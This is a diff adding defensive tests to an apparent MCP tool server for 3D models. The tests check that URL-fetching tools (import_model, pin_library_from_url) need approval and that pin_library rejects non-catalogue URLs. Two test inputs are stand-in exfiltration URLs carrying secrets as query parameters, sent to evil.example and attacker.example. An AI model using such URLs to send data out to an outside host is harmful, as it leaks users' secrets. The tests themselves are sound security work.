@@ -5,6 +5,7 @@ import { tiersUpTo } from '../src/auth/principal.js'
 import { ALL_TOOLS } from '../src/tools/index.js'
 import { PendingActionStore } from '../src/tools/pending.js'
 import { runTool, type Tool, type ToolContext } from '../src/tools/registry.js'
+import { sameRepository } from '../src/tools/libraries.js'
 import { redact } from '../src/tools/settings.js'
 import { validateParams } from '../src/tools/validate.js'
 import { BACKEND, firstText, services } from './helpers/mcp.js'
@@ -258,6 +259,82 @@ describe('analyze_geometry', () => {
     expect(t.risk).toBe('read')
     const result = await runTool(t, { output_id: id }, ctx({ principal: { id: 'r', kind: 'bearer', tiers: ['read'] } }))
     expect(firstText(result)).toEqual({ open_edges: 0, bbox_mm: { size: [1, 2, 3] } })
+  })
+})
+
+describe('tools that make the backend fetch a URL (exfiltration, not SSRF)', () => {
+  const CATALOGUE = [{ name: 'BOSL2', url: 'https://github.com/BelfrySCAD/BOSL2', ref: 'v2.0.0', homepage: '', licence: '' }]
+
+  it('import_model is gated: it only prepares, the backend is never called', async () => {
+    const result = await runTool(tool('import_model'), { url: 'https://evil.example/x?d=secret' }, ctx())
+    expect(firstText(result)).toMatchObject({
+      status: 'pending_approval',
+      summary: 'Fetch and import a model from https://evil.example/x?d=secret',
+    })
+  })
+
+  it('pin_library runs unattended for a catalogue library, with or without its own URL', async () => {
+    const puts: unknown[] = []
+    server.use(
+      http.get(`${BACKEND}/api/v1/libraries`, () => HttpResponse.json(CATALOGUE)),
+      http.put(`${BACKEND}/api/v1/models/box/libraries/BOSL2`, async ({ request }) => {
+        puts.push(await request.json())
+        return HttpResponse.json({ slug: 'box' })
+      }),
+    )
+    expect((await runTool(tool('pin_library'), { slug: 'box', name: 'BOSL2' }, ctx())).isError).toBeFalsy()
+    const sameRepo = { slug: 'box', name: 'BOSL2', url: 'HTTPS://GitHub.com/BelfrySCAD/BOSL2.git/', ref: 'v2.1.0' }
+    expect((await runTool(tool('pin_library'), sameRepo, ctx())).isError).toBeFalsy()
+    expect(puts).toEqual([
+      { ref: null, url: null },
+      { ref: 'v2.1.0', url: null },
+    ])
+  })
+
+  it('pin_library refuses a non-catalogue URL and points to the outward tool', async () => {
+    let put = false
+    server.use(
+      http.get(`${BACKEND}/api/v1/libraries`, () => HttpResponse.json(CATALOGUE)),
+      http.put(`${BACKEND}/api/v1/models/box/libraries/:name`, () => {
+        put = true
+        return HttpResponse.json({})
+      }),
+    )
+    for (const args of [
+      { slug: 'box', name: 'BOSL2', url: 'https://attacker.example/BOSL2?d=secret' },
+      { slug: 'box', name: 'NotInCatalogue', url: 'https://github.com/BelfrySCAD/BOSL2' },
+    ]) {
+      const result = await runTool(tool('pin_library'), args, ctx())
+      expect(result.isError).toBe(true)
+      expect(firstText(result)).toContain('pin_library_from_url')
+    }
+    expect(put).toBe(false)
+  })
+
+  it('pin_library_from_url is gated', async () => {
+    const result = await runTool(
+      tool('pin_library_from_url'),
+      { slug: 'box', name: 'mylib', url: 'https://example.com/mylib.git', ref: 'v1' },
+      ctx(),
+    )
+    expect(firstText(result)).toMatchObject({ status: 'pending_approval' })
+    expect(tool('pin_library_from_url').risk).toBe('outward')
+    expect(tool('import_model').risk).toBe('outward')
+    expect(tool('pin_library').risk).toBe('write')
+  })
+
+  it('compares repositories the way the backend does', () => {
+    expect(sameRepository('https://github.com/o/r', 'HTTPS://GITHUB.COM/o/r.git/')).toBe(true)
+    expect(sameRepository('https://github.com/o/r', 'https://github.com/O/r')).toBe(false)
+    expect(sameRepository('https://github.com/o/r', 'https://github.com/o/r2')).toBe(false)
+  })
+})
+
+describe('base64 inputs', () => {
+  it('refuses malformed base64 instead of uploading truncated bytes', async () => {
+    const result = await runTool(tool('upload_asset'), { slug: 'box', filename: 'a.png', content_base64: 'iVBOR!!w0K' }, ctx())
+    expect(result.isError).toBe(true)
+    expect(firstText(result)).toContain('not valid base64')
   })
 })
 
